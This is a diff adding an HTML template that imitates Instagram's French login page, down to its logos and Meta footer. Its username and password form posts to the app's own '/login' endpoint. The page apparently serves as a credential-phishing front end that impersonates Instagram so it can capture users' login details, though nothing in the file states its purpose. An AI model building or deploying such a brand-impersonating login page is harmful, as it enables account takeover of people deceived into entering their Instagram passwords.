@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="fr" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Connexion</title>
+    <script src="../static/htmx.min.js.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            /* Light mode colors */
+            --bg-primary: #ffffff;
+            --bg-secondary: #fafafa;
+            --text-primary: #262626;
+            --text-secondary: #8e8e8e;
+            --border-color: #dbdbdb;
+            --input-bg: #fafafa;
+            --button-bg: #0095f6;
+            --button-hover: #1877f2;
+            --link-color: #00376b;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            :root {
+                /* Dark mode colors */
+                --bg-primary: #1d1d2500;
+                --bg-secondary: #1c2a33fa;
+                --text-primary: #f5f5f5;
+                --text-secondary: #a8a8a8;
+                --border-color: #344f5c;
+                --input-bg: #1c2a33c5;
+                --button-bg: #0064E0;
+                --button-hover: #1877f2;
+                --link-color: #e0f1ff;
+            }
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-secondary);
+            color: var(--text-primary);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 5px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .login-box {
+            background-color: var(--bg-primary);
+            border: 1px solid var(--border-color);
+            border-radius: 1px;
+            padding: 4px 0px 4px;
+            margin-bottom: 0px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+            top: -52px;
+        }
+
+        .language-selector {
+            position: relative;
+            top: -80px;
+            width: 100%;
+            text-align: center;
+            margin-bottom: 6px;
+        }
+
+        .language-selector select {
+            background-color: var(--input-bg);
+            color: var(--text-primary);
+            border: 1px solid var(--border-color);
+            padding: 9px 32px 9px 12px;
+            border-radius: 3px;
+            font-size: 12px;
+            cursor: pointer;
+            outline: none;
+        }
+
+        .logo-container {
+            width: 100%;
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+
+        .instagram-icon-container {
+            width: 96px;
+            height: 96px;
+            margin-bottom: 30px;
+        }
+
+        .instagram-icon-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .login-form {
+            width: 100%;
+        }
+
+        .form-group {
+            margin-bottom: 6px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 9px 0 9px 8px;
+            background-color: var(--input-bg);
+            border: 1.5px solid var(--border-color);
+            border-radius: 9px;
+            font-size: 14px;
+            color: var(--text-primary);
+            outline: none;
+            line-height: 18px;
+            height: 57px;
+            margin: 3px 0 10px 0;
+        }
+
+        .input-field::placeholder {
+            color: var(--text-secondary);
+            font-size: 12px;
+        }
+
+        .input-field:focus {
+            border-color: var(--text-secondary);
+        }
+
+        .login-button {
+            width: 100%;
+            height: 50px;
+            background-color: var(--button-bg);
+            color: white;
+            border: none;
+            border-radius: 23px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: -3px;
+        }
+
+        .login-button:hover {
+            background-color: var(--button-hover);
+        }
+
+        .login-button:active {
+            opacity: 0.7;
+        }
+
+        .forgot-password {
+            width: 100%;
+            text-align: center;
+            font-weight: 600;
+            margin-top: 24px;
+        }
+
+        .forgot-password a {
+            color: var(--link-color);
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .signup-box {
+            width: 100%;
+            background-color: var(--bg-primary);
+            border: 1px solid var(--border-color);
+            border-radius: 1px;
+            padding: 25px 40px;
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 16px;
+        }
+
+        .signup-box a {
+            color: var(--button-bg);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .signup-box a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            width: 100%;
+            text-align: center;
+            margin-top: 2px;
+        }
+        .footer ,.signup-box{
+            position: relative;
+            bottom: 48px;
+        }
+        body{
+            position: fixed;
+            left: 5%;
+        }
+        .meta-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .meta-logo img {
+            height: 22px;
+            width: auto;
+        }
+
+        @media (max-width: 450px) {
+            .login-box {
+                padding: 40px 20px;
+                border: none;
+                background-color: transparent;
+            }
+
+            .signup-box {
+                padding: 24px 20px;
+                border: none;
+                background-color: transparent;
+            }
+        }
+        
+        #logo1_{
+            position: relative;
+            bottom: 30px;
+            width: 53px;
+            justify-content: center;
+        }
+
+        #replay {
+            margin-top: 16px;
+            padding: 12px 16px;
+            background-color: #ff4458;
+            color: #ffffff;
+            border-radius: 8px;
+            font-size: 13px;
+            line-height: 1.4;
+            text-align: center;
+            border-left: 3px solid #d63145;
+            display: none;
+            animation: slideDown 0.3s ease;
+        }
+
+        #replay:not(:empty) {
+            display: block;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @media (prefers-color-scheme: dark) {
+            #replay {
+                background-color: #8b2635;
+                border-left-color: #ff4458;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <!-- Language Selector -->
+            <div class="language-selector">
+                <select id="languageSelect" >
+                    <option value="fr" selected>Français (France)</option>
+                    <option value="en">English</option>
+                    <option value="ar">العربية</option>
+                    <option value="es">Español</option>
+                </select>
+            </div>
+
+            <!-- Instagram Icon -->
+            <div id="logo1_" class="instagram-icon-container">
+                <img id="logo1" src="../static/logo_insta.png" alt="Instagram">
+            </div>
+
+            <!-- Login Form -->
+            <form class="login-form" hx-post="/login" hx-target="#replay" id="loginForm">
+                <div class="form-group">
+                    <input 
+                        type="text" 
+                        class="input-field" 
+                        name="username"
+                        placeholder="Nom de profil, e-mail ou numéro de mobile"
+                        required
+                    >
+                </div>
+                <div class="form-group">
+                    <input 
+                        type="password" 
+                        class="input-field" 
+                        name="password"
+                        placeholder="Mot de passe"
+                        required
+                    >
+                </div>
+                <button type="submit" class="login-button">Se connecter</button>
+                <br><div id="replay"></div>
+            </form>
+
+            <!-- Forgot Password -->
+            <div class="forgot-password">
+                <a href="{{url_for('oublier')}}">Mot de passe oublié ?</a>
+            </div>
+        </div>
+
+        <!-- Sign Up Box -->
+        <div class="signup-box">
+            Vous n'avez pas de compte ? <a href="#">Créer un compte</a>
+        </div>
+
+        <!-- Meta Logo -->
+        <div class="footer">
+            <div class="meta-logo">
+                <img src="../static/Logo2.png" alt="Meta">
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Form Submit Handler
+        document.getElementById('loginForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            console.log('Form submitted');
+        });
+        </script>
+        
+</body>
+</html>
